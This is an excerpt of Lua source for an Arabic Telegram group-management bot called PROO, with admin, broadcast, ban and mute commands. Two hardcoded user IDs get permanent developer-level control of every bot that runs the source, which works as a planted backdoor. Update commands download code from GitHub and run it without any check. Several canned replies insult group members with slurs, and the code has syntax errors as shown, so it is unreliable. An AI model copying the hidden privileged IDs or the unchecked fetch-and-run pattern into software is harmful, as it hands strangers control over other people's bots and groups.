...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./PROO.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
local config = loadfile("PROO.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/PROOTEAM/Files_PROO/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1654178416,18144115004}   
...
if hash or SudoBot(msg) or DevPROOW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevPROOW(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevPROOW(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevPROOW(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevPROOW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevPROOW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
...
if hash or SudoBot(msg) or DevPROOW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1654178416) then
var = true  
elseif tonumber(user_id) == tonumber(18144115004) then
var = true  
...
local UserName = (data.username_ or "PROO_UU_4")
...
PROO_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
PROO_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
PROO_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
PROO_Msg = 'اممالكطور التفاعل' 
...
--------------------------------------------------------------------------------------------------------------
function SourcePROO(msg,data) -- بداية العمل
if msg then
...
if DevPROOW(msg) then
local bl = ' ↝✰↜ اهلا عزيزي آلمـطـور\n ↝✰↜ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n ↝✰↜ تسـتطـيع‌‏ آلتحگم باوامر البوت\n ↝✰↜ من خلاال الكيبورت خاص بك\n ↝✰↜ قناة سورس البوت [اضغط هنا](t.me/PROO_UU_4)'
local keyboard = {
{'مطور السورس','صاحب السورس'},
...
{'ضع اسم للبوت','المطورين'},
{'ضع كليشه ستارت', 'حذف كليشه ستارت'},
{'اذاعه','اذاعه خاص'},
{'اذاعه بالتثبيت','اذاعه بالتوجيه','اذاعه بالتوجيه خاص'},
{'قائمه العام', 'قائمه الكتم العام'},
{'تفعيل البوت الخدمي', 'تعطيل البوت الخدمي'},
{'تفعيل الاشتراك الاجباري','تعطيل الاشتراك الاجباري'},
{'الاشتراك الاجباري', 'وضع قناه الاشتراك الاجباري'},
{'جلب نسخه احتياطيه'},
{'معلومات السيرفر'},
{'الغاء'},
}
...
if not DevPROOW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevPROOW(msg) and msg.reply_to_message_id_ ~= 0  then    
...
send(msg.chat_id_, msg.id_,PROO_Msg) 
return false  
end 
if text then    
...
if text == 'تفعيل التواصل' and DevPROOW(msg) then  
...
if text == 'تعطيل التواصل' and DevPROOW(msg) then  
...
if text == 'تفعيل البوت الخدمي' and DevPROOW(msg) then  
...
if text == 'تعطيل البوت الخدمي' and DevPROOW(msg) then  
...
if text == 'ضع كليشه ستارت' and DevPROOW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ↝✰↜ ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشه ستارت' and DevPROOW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ↝✰↜ تم حذف كليشه ستارت')
end
if text == 'معلومات السيرفر' and DevPROOW(msg) then 
...
if text == 'تحديث السورس' and DevPROOW(msg) then 
os.execute('rm -rf PROO.lua')
os.execute('wget https://raw.githubusercontent.com/PROOTEAM/PROO/master/PROO.lua')
send(msg.chat_id_, msg.id_,' ↝✰↜ تم تحديث السورس \n ↝✰↜ لديك اخر اصدار لسورس 𝐏𝐑𝐎𝐎\n ↝✰↜ الاصدار » { 1.3v}')
dofile('PROO.lua')  
end
if text == 'الاصدار' and DevPROOW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ↝✰↜ اصدار سورس 𝐏𝐑𝐎𝐎 \n ↝✰↜ الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت' and DevPROOW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ↝✰↜ [تحديثات البوت](t.me/PROO_UU_4) \n ↝✰↜ [قناه السورس](t.me/PROO_UU_4)')
end
if text == "ضع اسم للبوت" and DevPROOW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل اليه الاسم الان ")
return false
end
if text == 'الاحصائيات' and DevPROOW(msg) then 
...
if text == 'المشتركين' and DevPROOW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ↝✰↜ المشتركين»{`'..Users..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الجروبات' and DevPROOW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ↝✰↜ الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين") and DevPROOW(msg) then
...
if text == ("قائمه العام") and DevPROOW(msg) then
...
if text == ("قائمه الكتم العام") and DevPROOW(msg) then
...
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DevPROOW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل الان اذاعتك؟ \n ↝✰↜ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه" and msg.reply_to_message_id_ == 0 and DevPROOW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل الان اذاعتك؟ \n ↝✰↜ للخروج ارسل الغاء ")
return false
end  
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevPROOW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل الان اذاعتك؟ \n ↝✰↜ للخروج ارسل الغاء ")
return false
end 
if text=="اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0  and DevPROOW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل لي التوجيه الان")
return false
end 
if text=="اذاعه بالتوجيه خاص" and msg.reply_to_message_id_ == 0  and DevPROOW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ↝✰↜ ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه' and DevPROOW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين" and DevPROOW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "تنظيف الجروبات" and DevPROOW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
send(msg.chat_id_, msg.id_,'↝✰↜  عدد الجروبات الان » { '..#group..' }'..PROOk..''..PROO..'\n↝✰↜  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevPROOW(msg) then
...
usertext = '\n ↝✰↜ العضو » ['..result.title_..'](t.me/'..(username or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم ترقيته مطور'
...
if text and text:match("^رفع مطور (%d+)$") and DevPROOW(msg) then
...
usertext = '\n ↝✰↜ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم ترقيته مطور'
...
if text and text:match("^تنزيل مطور @(.*)$") and DevPROOW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevPROOW(msg) then
...
local PROO1_Msg = database:get(bot_id.."PROO1:Add:Filter:Rp2"..text..msg.chat_id_)   
if PROO1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ↝✰↜ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'PROO_UU_4')..') \n ↝✰↜ '..PROO1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if PROO_Msg and not Special(msg) then  
local PROO_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if PROO_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ↝✰↜ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ↝✰↜ ["..PROO_Msg.."] \n")
else
send(msg.chat_id_,0," ↝✰↜ العضو : {["..data.first_name_.."](T.ME/PROO_UU_4)}\n ↝✰↜ ["..PROO_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ↝✰↜ عذرا » {["..data.first_name_.."](T.ME/PROO_UU_4)}\n ↝✰↜ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevPROOW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevPROOW(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevPROOW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ↝✰↜ حسنآ ارسل لي معرف القناة')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevPROOW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ↝✰↜ حسنآ ارسل لي النص الذي تريده')
return false  
end
if text == "حذف رساله الاشتراك 『✰』" and DevPROOW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " ↝✰↜ تم مسح رساله الاشتراك ")
return false  
end
if text and text:match("^وضع قناة الاشتراك 『✰』$") and DevPROOW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' ↝✰↜ حسنآ ارسل لي معرف القناة')
return false  
end
if text == "تفعيل الاشتراك الاجباري 『✰』" and DevPROOW(msg) then  
if database:get(bot_id..'add:ch:id') then
...
if text == "تعطيل الاشتراك الاجباري 『✰』" and DevPROOW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " ↝✰↜ تم تعطيل الاشتراك الاجباري ")
return false  
end
if text == "الاشتراك الاجباري 『✰』" and DevPROOW(msg) then  
...
database:sadd(bot_id.."PROO:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."PROO:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_PROO = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_PROO then 
names_PROO = database:smembers(bot_id.."PROO:blocname"..msg.chat_id_) or ""
if names_PROO and names_PROO[1] then 
for i=1,#names_PROO do 
if name_PROO:match("(.*)("..names_PROO[i]..")(.*)") then 
...
database:set(bot_id.."PROO:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."PROO:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."PROO:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."PROO:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."PROO:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_PROOa_new(PROO1,PROO2)
if PROO2 and PROO2.first_name_ then 
if PROO2.first_name_:match("(.*)"..database:get(bot_id.."PROO:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."PROO:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local PROO_nnn = database:get(bot_id.."PROO:nump"..msg.chat_id_) or 5
local PROO_nnn2 = database:get(bot_id.."PROO:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(PROO_nnn2) == tonumber(PROO_nnn) or tonumber(PROO_nnn2) > tonumber(PROO_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."PROO:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "↝✰↜ عزيزي >>["..PROO2.username_.."](https://t.me/"..(PROO2.username_ or "PROO_UU_4")..")\n↝✰↜ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."PROO:teh"..msg.chat_id_).."} بجانب اسمك\n↝✰↜ عدد المحاولات المتبقيه {"..(tonumber(PROO_nnn) - tonumber(PROO_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_PROOa_new)
end
end
...
local PROOChengName = database:get(bot_id.."PROO:Cheng:Name"..data.id_)
if not data.first_name_ then 
if PROOChengName then 
send(msg.chat_id_, msg.id_, " يوزر قمد يستا ["..PROOChengName..']')
database:del(bot_id.."PROO:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if PROOChengName ~= data.first_name_ then 
local Text = {
  "تيرارارار النيم القديم كن احلا 🌚❤️",
"غيرت اسمك لي يقمر نت 🌚😹",
"وييييي قفشتكك نيم جديد ها 🌚😹",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."PROO:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local PROOChengUserName = database:get(bot_id.."PROO:Cheng:UserName"..data.id_)
if not data.username_ then 
if PROOChengUserName then 
send(msg.chat_id_, msg.id_, 1, "الحق الود الهكر شال اليوزر   \n اليوزر تاعه  : [@"..PROOChengUserName..']')
database:del(bot_id.."PROO:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if PROOChengUserName ~= data.username_ then 
local Text = {
"وييييي قفشتكك غيرت يوزرك لي 🌚😹",
"حد داس ع وشك ف غيرت اليوزر ثح 🌚😹 💔".
"اوووه ياااه يوزر جديد وبتع : "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."PROO:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local PROOChengPhoto = database:get(bot_id.."PROO:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if PROOChengPhoto then 
send(msg.chat_id_, msg.id_, "مسحت صورك لي 🌚💔")
database:del(bot_id.."PROO:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if PROOChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "وه 🌚 غيرت صورتك 😹💔",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."PROO:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
local Text = [[ 
✭━━━━━━[𝐏𝐑𝐎𝐎](t.me/PROO_UU_4)━━━━━━✭
✰ مرحبا بك في سورس برو ✰
✰ سورس سريع وامن ✰
✰ بكل المميزات ✰
✰ اتبع الازرار لتواصل مع المطورين ✰
✭━━━━━━[𝐏𝐑𝐎𝐎](t.me/PROO_UU_4)━━━━━━✭
]] 
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = 'مطور السورس', url="t.me/I_C_X"}},
{{text = 'صاحب السورس', url="t.me/RagnarrXx}},
{{text = 'قناه السورس', url="t.me/PROO_UU_4"}},
{{text = 'بوت التواصل', url="t.me/بوت تواصل}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'مارتن' or text == 'marten' or text == 'محمد' then
local Text = [[
مطور السورس
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩𝑫𝑬𝑽 𝑴𝑨𝑹𝑻𝑬𝑵𓆪',url="t.me/I_C_X"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'برنجو' or text == 'صاحب السورس' then
local Text = [[
صاحب السورس
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩 𝑫𝑬𝑽 𝑩𝑹𝑰𝑵𝑮𝑶𓆪',url="t.me/RagnarrXx"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مارتن مطور السورس' then
local Text = [[
مطور السورس
]]
keyboard = {} 
...
if text == 'قناه السورس' or text == 'قناه سورس' or text == 'قناة السورس' then
local Text = [[ 
[𝑪𝑯↝ 𝐏𝐑𝐎𝐎](t.me/PROO_UU_4)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝑪𝑯↝ 𝐏𝐑𝐎𝐎', url="t.me/PROO_UU_4"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[ 
[TWASOL SOURCE PROO](t.me/G_1_B)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐓𝐖', url="t.me/G_1_B"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'رفع نسخه الاحتياطيه' and DevPROOW(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ↝✰↜ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'PROO_UU_4')..') \n ↝✰↜ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ↝✰↜ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'PROO_UU_4')..') \n ↝✰↜ تـم قفـل التاك بالكتم ')
end,nil)   
...
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevPROOW(msg) then    
dofile('PROO.lua')  
send(msg.chat_id_, msg.id_, ' ↝✰↜ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevPROOW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevPROOW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^حظر عام @(.*)$")  and DevPROOW(msg) then
...
if text and text:match("^حظر عام (%d+)$") and DevPROOW(msg) then
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevPROOW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^كتم عام @(.*)$")  and DevPROOW(msg) then
...
if text and text:match("^كتم عام (%d+)$") and DevPROOW(msg) then
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevPROOW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^الغاء العام @(.*)$") and DevPROOW(msg) then
...
if text and text:match("^الغاء العام (%d+)$") and DevPROOW(msg) then
...
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevPROOW(msg) then
...
if text == 'الملفات' and DevPROOW(msg) then
t = ' ↝✰↜ ملفات السورس 𝐏𝐑𝐎𝐎 ↓\n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
...
if DevPROOW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/PROOTEAM/Files_PROO/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ↝✰↜ اهلا بك في متجر ملفات 𝐏𝐑𝐎𝐎\n ↝✰↜ ملفات السورس ↓\n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫\n\n"
local TextE = "\n≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫\n ↝✰↜ علامة تعني { ✓ } ملف مفعل\n ↝✰↜ علامة تعني { ✘ } ملف معطل\n ↝✰↜ قناة سورس 𝐏𝐑𝐎𝐎 ↓\n".." ↝✰↜ [اضغط هنا لدخول](t.me/PROO_UU_4) \n"
local NumFile = 0
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevPROOW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/PROOTEAM/Files_PROO/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('PROO.lua')  
else
send(msg.chat_id_, msg.id_," ↝✰↜ عذرا الملف لايدعم سورس 𝐏𝐑𝐎𝐎 \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevPROOW(msg) then
...
if text == "مسح الملفات" and DevPROOW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ↝✰↜ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevPROOW(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevPROOW(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("مسح قائمه مالك") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ↝✰↜ تم مسح قائمه مالك')
return false
end

if text == 'قائمه مالك' and Sudo(msg) then
...
local UserName = (b.username_ or "PROO_UU_4")
...
function Function_PROO(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_PROO, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_PROO, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ↝✰↜ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ↝✰↜ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم تنزيل العضو كلب في الجروب\n ↝✰↜ تع هتت العضمه لي اخدتها يت 🌚😹'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
-----------------------------------------------------
if text == ("مارتن التونز اكسوفيا2004") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n ↝✰↜ قائمه مقتولين الجروب \nٴ≪≪━━━━━━≪𝐏𝐑𝐎𝐎≫━━━━━━≫≫ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» المقتول [@"..username.."]\n"
else
t = t..""..k.."» المقتول `"..v.."`\n"
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
local  statuss  = '\n ↝✰↜ تم قتل العضو بنجاح \n ↝✰↜ كان تيب 🌚💔ثح'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
...
-----------------------------------------------------
if text == 'تنزيل الخنازير' and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ↝✰↜ تم مسح جميع الكلاب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
local  statuss  = '\n ↝✰↜ تم رفع العضو خنزير في الجروب \n ↝✰↜ عيل خنزير ابن وصخه 🌚😹❤️'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم تنزيل العضو خنزير في الجروب \n ↝✰↜ اخيرا بطلت خنزره 🌚😹💔'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
-----------------------------------------------------
if text == 'تنزيل وتكه' and Mod(msg) then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم تنزيل العضــو وتكه من الجروب\n ↝✰↜ تب يلا من هن بق 🌚😹'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ↝✰↜ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'PROO_UU_4')..')'
status  = '\n ↝✰↜ تم تنزيل العضــو مزه من الجروب\n ↝✰↜ بلا مظه بلا بتع انتري من هنن 🌚😹'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
-----------------------------------------------------
if text == 'تنزيل النعسانين' and Mod(msg) then
database:del(bot_id..'Sakl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ↝✰↜ تم تنزيل النعسانين اخيرا فوقتو 🌚😹')
end
if text == ("تاك للنعسانين") and Mod(msg) then
